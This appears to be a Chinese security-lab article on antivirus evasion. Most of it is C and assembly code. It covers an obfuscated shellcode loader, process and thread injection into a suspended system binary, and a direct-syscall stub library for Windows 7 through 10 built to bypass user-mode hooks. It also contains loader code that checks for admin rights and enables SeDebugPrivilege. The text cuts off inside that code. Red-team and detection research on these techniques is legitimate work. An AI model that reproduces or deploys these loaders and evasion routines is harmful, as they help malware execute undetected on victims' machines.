# 免杀技术大杂烩---乱拳也打不死老师傅
Author: Boi@Linton Lab 360

[TOC]

左上角按钮可以看目录树

---

目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。

对特征来讲，大多数杀毒软件会定义一个阈值，当文件内部的特征数量达到一定程度就会触发报警，也不排除杀软会针对某个EXP会限制特定的入口函数来查杀。当然还有通过md5，sha1等hash函数来识别恶意软件，这也是最简单粗暴，最容易绕过的。 针对特征的免杀较为好做，可以使用加壳改壳、添加/替换资源、修改已知特征码/会增加查杀概率的单词（比如某函数名为ExecutePayloadshellcode）、加密Shellcode等等。

CreateThread
CreateThreadEx

xxx -> ntdll.dll -> win32API 

对行为来讲，很多个API可能会触发杀软的监控，比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。除常规的替换、使用未导出的API等姿势外，我们还可以使用通过直接系统调用的方式实现，比如使用内核层面Zw系列的API，绕过杀软对应用层的监控（如下图所示，使用ZwAllocateVirtualMemory函数替代VirtualAlloc）。

## Loader tech
### CreateThread
```c
int main()
{
	LPVOID lpvAddr = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	unsigned char data[] = "\x00\x48\x83";
	char a1[] = "\xfc\xe4\xc8";

	SIZE_T Size = sizeof(data);
	
	//decrypt
	for (int i = 0; i < sizeof(a1); i++) {
		memcpy(&data[i * 3], &a1[i], 1);
	}

	RtlMoveMemory(lpvAddr, data, sizeof(data));
	DWORD pa = 0x01;
	VirtualProtect(lpvAddr, sizeof(data), 0x10, &pa);

	if (lpvAddr != NULL) {
		HANDLE s;
		s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, data, 0, 0);
		WaitForSingleObject(s, INFINITE);
	}
}
```

### ThreadHijacking
VirtualAllocEx(CreateNewProcess)
```c
char a1[] = "\xfc\xe4\xc8\x00\x41\x51...";

SIZE_T size = 0;
STARTUPINFOEXA si;
PROCESS_INFORMATION pi;

ZeroMemory(&si, sizeof(si));
si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;

ZeroMemory(&si, sizeof(si));
si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

BOOL success = CreateProcessA(
	NULL,
	(LPSTR)"C:\\Windows\\System32\\mblctr.exe",
	NULL,
	NULL,
	true,
	CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,//有扩展启动信息的结构体
	NULL,
	NULL,
	reinterpret_cast<LPSTARTUPINFOA>(&si),
	&pi);
	
HANDLE notepadHandle = pi.hProcess;
LPVOID remoteBuffer = VirtualAllocEx(notepadHandle, NULL, sizeof data, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

WriteProcessMemory(notepadHandle, remoteBuffer, data, sizeof data, NULL);
HANDLE remoteThread = CreateRemoteThread(notepadHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

if (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) {
	return 1;
}

if (ResumeThread(pi.hThread) == -1) {
	return 1;
}
```

VirtualAllocEx(Use existing app)

```c
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, false, procID);
if (hProc == INVALID_HANDLE_VALUE) {
    printf("Error opening process ID %d\n", procID);
    return 1;
}
void *alloc = VirtualAllocEx(hProc, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (alloc == NULL) {
    printf("Error allocating memory in remote process\n");
    return 1;
}
if (WriteProcessMemory(hProc, alloc, shellcode, sizeof(shellcode), NULL) == 0) {
    printf("Error writing to remote process memory\n");
    return 1;
}
HANDLE tRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
if (tRemote == INVALID_HANDLE_VALUE) {
    printf("Error starting remote thread\n");
    return 1;
}
WaitForSingleObject(tRemote, INFINITE) == WAIT_FAILED
```

### VirtualProtect

```c
// BOOL VirtualProtect(
//   LPVOID lpAddress,
//   SIZE_T dwSize,
//   DWORD  flNewProtect,
//   PDWORD lpflOldProtect
// );

LPVOID lpvAddr = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
DWORD pa = 0x01;
VirtualProtect(lpvAddr, sizeof(data), PAGE_EXECUTE, &pa);
//PAGE_EXECUTE 启用对页面的提交区域的执行访问。尝试写入提交的区域会导致访问冲突
```

### sRDI
https://github.com/monoxgas/sRDI

![-w888](https://i.loli.net/2021/01/18/hwA38dpSKGcFzjC.jpg)

### 系统直接调用
Windows操作系统中实际只使用了两个特权级别：

一个是Ring3层，平时我们所见到的应用程序运行在这一层，所以叫它用户层，也叫User-Mode。所以下次听到别人讲（Ring3、用户层、User-Mode）时，其实是在讲同一个概念。

一个是Ring0层，像操作系统内核（Kernel）这样重要的系统组件，以及设备驱动都是运行在Ring0，内核层，也叫Kernel-Mode。
![](https://i.loli.net/2021/01/18/oTnF7B3qfQjGad8.jpg)

通过这些保护层来隔离普通的用户程序，不能直接访问内存区域，以及运行在内核模式下的系统资源。

当一个用户层程序需要执行一个特权系统操作，或者访问内核资源时。处理器首先需要切换到Ring0模式下才能执行后面的操作。

切换Ring0的代码，也就是直接系统调用所在的地方。

我们通过监控Notepad.exe进程保存一个.txt文件，来演示一个应用层程序如何切换到内核模式执行的：
![](https://i.loli.net/2021/01/18/uJASWrpD4dGmkfw.jpg)

我们可以看到 notepad调用了kernel32模块中的WriteFile 函数，然后该函数内部又调用了ntdll中的NtWriteFile来到了Ring3与Ring0的临界点。

因为程序保存文件到磁盘上，所以操作系统需要访问相关的文件系统和设备驱动。应用层程序自己是不允许直接访问这些需要特权资源的。

应用程序直接访问设备驱动会引起一些意外的后果（当然操作系统不会出事，最多就是应用程序的执行流程出错导致崩溃）。所以，在进入内核层之前，调用的最后一个用户层API就是负责切换到内核模式的。

CPU中通过执行syscall指令，来进入内核模式，至少x64架构是这样的。

![-w1078](https://i.loli.net/2021/01/18/3VIi6YBRvwmG7uP.jpg)

把被调用函数相关的参数PUSH到栈上以后，ntdll中的NtWriteFile函数的职责就是，设置EAX为对应的"系统调用号"，最后执行syscall指令，CPU就来到了内核模式（Ring0）下执行。

进入内核模式后，内核通过diapatch table（SSDT），来找到和系统调用号对应的Kernel API，然后将用户层栈上的参数，拷贝到内核层的栈中，最后调用内核版本的ZwWriteFile函数。

当内核函数执行完成时，使用几乎相同的方法回到用户层，并返回内核API函数的返回值（指向接收数据的指针或文件句柄）。

Windows系统架构图
![](https://i.loli.net/2021/01/18/nY8FZzJc1j4xq9e.jpg)

用户层的应用程序要想和底层系统交互，通常使用应用程序编程接口（Application Programming Interface ）也就是所谓的API。如果你是编写C/C++应用的Windows程序开发程序员，通常使用 Win32 API。

Win32API是微软封装的一套API接口，由几个DLL（所谓的Win32子系统DLL）组成。在Win32 API下面使用的是Naitve API（ntdll.dll），这个才是真正用户层和系统底层交互的接口，一般称为用户层和内核层之间的桥梁。

但是ntdll中函数大部分都没有被微软记录到官方的开发文档中，为了兼容性问题，大多数情况在写程序时，应该避免直接使用ntdll中的API。

如何通过编程来绕过Win32接口层，直接调用系统API并绕过潜在的Ring3层Hook？

#### system.asm
```c
.code

; Reference: https://j00ru.vexillium.org/syscalls/nt/64/

; Windows 7 SP1 / Server 2008 R2 specific syscalls

NtCreateThread7SP1 proc
		mov r10, rcx
		mov eax, 4Bh
		syscall
		ret
NtCreateThread7SP1 endp

ZwOpenProcess7SP1 proc
		mov r10, rcx
		mov eax, 23h
		syscall
		ret
ZwOpenProcess7SP1 endp

ZwClose7SP1 proc
		mov r10, rcx
		mov eax, 0Ch
		syscall
		ret
ZwClose7SP1 endp

ZwWriteVirtualMemory7SP1 proc
		mov r10, rcx
		mov eax, 37h
		syscall
		ret
ZwWriteVirtualMemory7SP1 endp

ZwProtectVirtualMemory7SP1 proc
		mov r10, rcx
		mov eax, 4Dh
		syscall
		ret
ZwProtectVirtualMemory7SP1 endp

ZwQuerySystemInformation7SP1 proc
		mov r10, rcx
		mov eax, 33h
		syscall
		ret
ZwQuerySystemInformation7SP1 endp

NtAllocateVirtualMemory7SP1 proc
		mov r10, rcx
		mov eax, 15h
		syscall
		ret
NtAllocateVirtualMemory7SP1 endp

NtFreeVirtualMemory7SP1 proc
		mov r10, rcx
		mov eax, 1Bh
		syscall
		ret
NtFreeVirtualMemory7SP1 endp

NtCreateFile7SP1 proc
		mov r10, rcx
		mov eax, 52h
		syscall
		ret
NtCreateFile7SP1 endp

; Windows 8 / Server 2012 specific syscalls

ZwOpenProcess80 proc
		mov r10, rcx
		mov eax, 24h
		syscall
		ret
ZwOpenProcess80 endp

ZwClose80 proc
		mov r10, rcx
		mov eax, 0Dh
		syscall
		ret
ZwClose80 endp

ZwWriteVirtualMemory80 proc
		mov r10, rcx
		mov eax, 38h
		syscall
		ret
ZwWriteVirtualMemory80 endp

ZwProtectVirtualMemory80 proc
		mov r10, rcx
		mov eax, 4Eh
		syscall
		ret
ZwProtectVirtualMemory80 endp

ZwQuerySystemInformation80 proc
		mov r10, rcx
		mov eax, 34h
		syscall
		ret
ZwQuerySystemInformation80 endp

NtAllocateVirtualMemory80 proc
		mov r10, rcx
		mov eax, 16h
		syscall
		ret
NtAllocateVirtualMemory80 endp

NtFreeVirtualMemory80 proc
		mov r10, rcx
		mov eax, 1Ch
		syscall
		ret
NtFreeVirtualMemory80 endp

NtCreateFile80 proc
		mov r10, rcx
		mov eax, 53h
		syscall
		ret
NtCreateFile80 endp

; Windows 8.1 / Server 2012 R2 specific syscalls

NtCreateThread81 proc
		mov r10, rcx
		mov eax, 4Dh
		syscall
		ret
NtCreateThread81 endp

ZwOpenProcess81 proc
		mov r10, rcx
		mov eax, 25h
		syscall
		ret
ZwOpenProcess81 endp

ZwClose81 proc
		mov r10, rcx
		mov eax, 0Eh
		syscall
		ret
ZwClose81 endp

ZwWriteVirtualMemory81 proc
		mov r10, rcx
		mov eax, 39h
		syscall
		ret
ZwWriteVirtualMemory81 endp

ZwProtectVirtualMemory81 proc
		mov r10, rcx
		mov eax, 4Fh
		syscall
		ret
ZwProtectVirtualMemory81 endp

ZwQuerySystemInformation81 proc
		mov r10, rcx
		mov eax, 35h
		syscall
		ret
ZwQuerySystemInformation81 endp

NtAllocateVirtualMemory81 proc
		mov r10, rcx
		mov eax, 17h
		syscall
		ret
NtAllocateVirtualMemory81 endp

NtFreeVirtualMemory81 proc
		mov r10, rcx
		mov eax, 1Dh
		syscall
		ret
NtFreeVirtualMemory81 endp

NtCreateFile81 proc
		mov r10, rcx
		mov eax, 54h
		syscall
		ret
NtCreateFile81 endp

; Windows 10 / Server 2016 specific syscalls
 
ZwOpenProcess10 proc
		mov r10, rcx
		mov eax, 26h
		syscall
		ret
ZwOpenProcess10 endp

ZwClose10 proc
		mov r10, rcx
		mov eax, 0Fh
		syscall
		ret
ZwClose10 endp

ZwWriteVirtualMemory10 proc
		mov r10, rcx
		mov eax, 3Ah
		syscall
		ret
ZwWriteVirtualMemory10 endp

ZwProtectVirtualMemory10 proc
		mov r10, rcx
		mov eax, 50h
		syscall
		ret
ZwProtectVirtualMemory10 endp

ZwQuerySystemInformation10 proc
		mov r10, rcx
		mov eax, 36h
		syscall
		ret
ZwQuerySystemInformation10 endp

NtAllocateVirtualMemory10 proc
		mov r10, rcx
		mov eax, 18h
		syscall
		ret
NtAllocateVirtualMemory10 endp

NtFreeVirtualMemory10 proc
		mov r10, rcx
		mov eax, 1Eh
		syscall
		ret
NtFreeVirtualMemory10 endp

NtCreateFile10 proc
		mov r10, rcx
		mov eax, 55h
		syscall
		ret
NtCreateFile10 endp

NtCreateThread10 proc
		mov r10, rcx
		mov eax, 4Eh
		syscall
		ret
NtCreateThread10 endp

NtCreateThreadEx10 proc
		mov r10, rcx
		mov eax, 0BBh
		syscall
		ret
NtCreateThreadEx10 endp

NtAllocateVirtualMemoryEx10 proc
		mov r10, rcx
		mov eax, 0BBh
		syscall
		ret
NtAllocateVirtualMemoryEx10 endp
end
```
#### xx.h
```c
#pragma once

#include <Windows.h>

#define STATUS_SUCCESS 0
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define FILE_OVERWRITE_IF 0x00000005
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
typedef LONG KPRIORITY;

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _WIN_VER_INFO {
	WCHAR chOSMajorMinor[8];
	DWORD dwBuildNumber;
	UNICODE_STRING ProcName;
	HANDLE hTargetPID;
	LPCSTR lpApiCall;
	INT SystemCall;
} WIN_VER_INFO, * PWIN_VER_INFO;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation
} SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;

typedef struct _INITIAL_TEB
{
	struct
	{
		PVOID OldStackBase;
		PVOID OldStackLimit;
	} OldInitialTeb;
	PVOID StackBase;
	PVOID StackLimit;
	PVOID StackAllocationBase;
} INITIAL_TEB, * PINITIAL_TEB;

typedef struct _SYSTEM_PROCESSES {
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved1[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessId;
} SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		LONG Status;
		PVOID Pointer;
	};
	ULONG Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;


// Windows 7 SP1 / Server 2008 R2 specific Syscalls
EXTERN_C NTSTATUS WINAPI ZwQuerySystemInformation7SP1(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
EXTERN_C NTSTATUS ZwOpenProcess7SP1(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
EXTERN_C NTSTATUS NtFreeVirtualMemory7SP1(HANDLE ProcessHandle, PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, ULONG FreeType);
EXTERN_C NTSTATUS NtAllocateVirtualMemory7SP1(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
EXTERN_C NTSTATUS ZwProtectVirtualMemory7SP1(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS NtCreateThread7SP1(
	OUT PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	OUT PCLIENT_ID ClientId,
	IN  PCONTEXT ThreadContext,
	IN  PINITIAL_TEB InitialTeb,
	IN  BOOLEAN CreateSuspended
);

// Windows 8 / Server 2012 specific Syscalls
EXTERN_C NTSTATUS NtAllocateVirtualMemory80(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
EXTERN_C NTSTATUS NtCreateThread80(
	OUT PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	OUT PCLIENT_ID ClientId,
	IN  PCONTEXT ThreadContext,
	IN  PINITIAL_TEB InitialTeb,
	IN  BOOLEAN CreateSuspended
);

// Windows 8.1 / Server 2012 R2 specific Syscalls
EXTERN_C NTSTATUS ZwOpenProcess81(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
EXTERN_C NTSTATUS WINAPI ZwQuerySystemInformation81(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
EXTERN_C NTSTATUS NtFreeVirtualMemory81(HANDLE ProcessHandle, PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, ULONG FreeType);
EXTERN_C NTSTATUS NtAllocateVirtualMemory81(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
EXTERN_C NTSTATUS ZwProtectVirtualMemory81(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS NtCreateThread81(
	OUT PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	OUT PCLIENT_ID ClientId,
	IN  PCONTEXT ThreadContext,
	IN  PINITIAL_TEB InitialTeb,
	IN  BOOLEAN CreateSuspended
);

// Windows 10 / Server 2016 specific Syscalls
EXTERN_C NTSTATUS ZwOpenProcess10(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
EXTERN_C NTSTATUS WINAPI ZwQuerySystemInformation10(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
EXTERN_C NTSTATUS NtFreeVirtualMemory10(HANDLE ProcessHandle, PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, ULONG FreeType);
EXTERN_C NTSTATUS NtAllocateVirtualMemory10(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
EXTERN_C NTSTATUS ZwProtectVirtualMemory10(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS NtCreateThread10(
	OUT PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	OUT PCLIENT_ID ClientId,
	IN  PCONTEXT ThreadContext,
	IN  PINITIAL_TEB InitialTeb,
	IN  BOOLEAN CreateSuspended
);
EXTERN_C NTSTATUS NtCreateThreadEx10(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN ULONG StackZeroBits,
	IN ULONG SizeOfStackCommit,
	IN ULONG SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
);
EXTERN_C NTSTATUS NtAllocateVirtualMemoryEx10(
	_In_opt_ HANDLE Process,
	_In_opt_ PVOID* BaseAddress,
	_In_ SIZE_T* RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG PageProtection,
	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,
	_In_ ULONG ParameterCount
);

NTSTATUS(*NtAllocateVirtualMemoryEx) (
	_In_opt_ HANDLE Process,
	_In_opt_ PVOID* BaseAddress,
	_In_ SIZE_T* RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG PageProtection,
	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,
	_In_ ULONG ParameterCount
	);

NTSTATUS(*NtCreateThreadEx) (
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN ULONG StackZeroBits,
	IN ULONG SizeOfStackCommit,
	IN ULONG SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
	);

NTSTATUS(*NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
	);

NTSTATUS(*ZwProtectVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN PVOID* BaseAddress,
	IN SIZE_T* NumberOfBytesToProtect,
	IN ULONG NewAccessProtection,
	OUT PULONG OldAccessProtection
	);

NTSTATUS(*NtFreeVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	ULONG FreeType
	);

NTSTATUS(*ZwOpenProcess)(
	PHANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID ClientId
	);

NTSTATUS(WINAPI* ZwQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

NTSTATUS(*NtCreateThread)(
	OUT PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	OUT PCLIENT_ID ClientId,
	IN  PCONTEXT ThreadContext,
	IN  PINITIAL_TEB InitialTeb,
	IN  BOOLEAN CreateSuspended
	);

typedef NTSTATUS(NTAPI* _RtlGetVersion)(
	LPOSVERSIONINFOEXW lpVersionInformation
	);

typedef void (WINAPI* _RtlInitUnicodeString)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

typedef NTSYSAPI BOOLEAN(NTAPI* _RtlEqualUnicodeString)(
	PUNICODE_STRING String1,
	PCUNICODE_STRING String2,
	BOOLEAN CaseInSensitive
	);
```
#### xx.c
```c
#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <Windows.h>
#include <stdio.h>
#include "Dumpert.h"

#pragma comment (lib, "Dbghelp.lib")

#define RPL_MASK                0x0003
#define MODE_MASK               0x0001
#define KGDT64_NULL             0x0000
#define KGDT64_R0_CODE          0x0010
#define KGDT64_R0_DATA          0x0018
#define KGDT64_R3_CMCODE        0x0020
#define KGDT64_R3_DATA          0x0028
#define KGDT64_R3_CODE          0x0030
#define KGDT64_SYS_TSS          0x0040
#define KGDT64_R3_CMTEB         0x0050
#define KGDT64_R0_LDT           0x0060

DWORD WINAPI StartAddress(LPVOID lpThreadParameter) {
	return ((int(__stdcall*)(LPVOID))lpThreadParameter)(lpThreadParameter);
}

NTSTATUS MyInitTeb(PINITIAL_TEB InitialTeb) {
	PVOID StackBaseAddr = NULL;
	SIZE_T StackSize = 0x1000 * 10;
	NTSTATUS Status;

	Status = NtAllocateVirtualMemory(GetCurrentProcess(),
		(PVOID*)&StackBaseAddr,
		0,
		&StackSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE);

	if (Status != 0) {
		printf("MyInitStack:%llx\n", Status);
		return Status;
	}
	InitialTeb->StackAllocationBase = (PVOID)StackBaseAddr;
	InitialTeb->StackBase = (PVOID)((INT64)StackBaseAddr + StackSize - 0x1000*5);
	InitialTeb->OldInitialTeb.OldStackBase = NULL;
	InitialTeb->OldInitialTeb.OldStackLimit = NULL;
	InitialTeb->StackLimit = StackBaseAddr;
	return STATUS_SUCCESS;
}

NTSTATUS MyInitContext(
	PCONTEXT pContext,
	PVOID ThreadFuncAddr,
	PVOID FuncArgAddr,
	PVOID StackBaseAddr) {
	// set rsp
	pContext->Rsp = (DWORD64)StackBaseAddr;
	// set ip and rcx
	pContext->Rip = (DWORD64)ThreadFuncAddr;
	pContext->Rcx = (DWORD64)FuncArgAddr;
	// nop
	pContext->Rax = (DWORD64)NULL;
	pContext->Rbx = (DWORD64)NULL;
	pContext->Rdx = (DWORD64)NULL;
	pContext->Rsi = (DWORD64)NULL;
	pContext->Rdi = (DWORD64)NULL;
	pContext->R8 = (DWORD64)NULL;
	pContext->R9 = (DWORD64)NULL;

	// set context flags
	pContext->ContextFlags = CONTEXT_FULL;

	// unknow
	pContext->EFlags = 0x3000;/* IOPL 3 */

	// set seg registers
	pContext->SegGs = KGDT64_R3_DATA | RPL_MASK;
	pContext->SegEs = KGDT64_R3_DATA | RPL_MASK;
	pContext->SegDs = KGDT64_R3_DATA | RPL_MASK;
	pContext->SegCs = KGDT64_R3_CODE | RPL_MASK;
	pContext->SegSs = KGDT64_R3_DATA | RPL_MASK;
	pContext->SegFs = KGDT64_R3_CMTEB | RPL_MASK;

	return STATUS_SUCCESS;
}


BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPWSTR lpwPriv = L"SeDebugPrivilege";
	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}


int wmain(int argc, wchar_t* argv[]) {

	// 仅支持64位系统
	if (sizeof(LPVOID) != 8) {
		exit(1);
	}
	//判断是否为管理员权限
	if (!IsElevated()) {
		exit(1);
	}

	SetDebugPrivilege();

	PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));

	// 获取版本信息
	OSVERSIONINFOEXW osInfo;
	LPWSTR lpOSVersion;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
	if (RtlGetVersion == NULL) {
		return FALSE;
	}

	wprintf(L"[1] Checking OS version details:\n");
	RtlGetVersion(&osInfo);
	swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
	pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		lpOSVersion = L"10 or Server 2016";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(L"	[+] Mapping version specific System calls.\n");
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
		NtCreateThread = &NtCreateThread10;
		pWinVerInfo->SystemCall = 0x3F;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
		lpOSVersion = L"7 SP1 or Server 2008 R2";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(L"	[+] Mapping version specific System calls.\n");
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory7SP1;
